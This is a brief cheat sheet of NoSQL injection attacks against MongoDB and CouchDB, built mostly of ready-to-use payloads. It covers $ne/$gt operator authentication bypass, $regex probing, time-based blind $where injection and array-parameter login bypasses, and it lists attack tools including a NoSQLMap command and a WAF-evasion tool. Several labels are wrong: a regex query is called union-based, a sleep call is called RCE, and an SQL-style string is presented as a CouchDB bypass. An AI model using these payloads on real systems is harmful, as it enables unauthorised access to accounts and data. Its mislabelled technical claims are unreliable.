# NoSQL Injection Guide — MongoDB/CouchDB
> Source: codingo/NoSQLMap (3350★), G0odKid/F14 (1★), Justice-Reaper/NoSQLI-Attack-Suite (3★)

## Attack Vectors

### MongoDB $where Injection
```js
// Auth bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}


```

### MongoDB Operator Injection
```js
// Union-based
{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}

// Time-based blind
{"username": {"$where": "if(this.password.length>0){sleep(5000)}"}}

// RCE via $where (if eval allowed)
{"$where": "sleep(5000)"}


```

### CouchDB Injection
```
// Auth bypass
username=admin' OR 1=1--&password=anything
username[]=admin&password[]=anything


```

## Tools
- **NoSQLMap** (3350★): `python nosqlmap.py -t URL --data "user=x&pass=x" --param user`
- **F14**: NoSQLi + WAF evasion (JA3 fingerprint impersonation)
- **NoSQLI-Attack-Suite**: MongoDB enumeration + exploitation
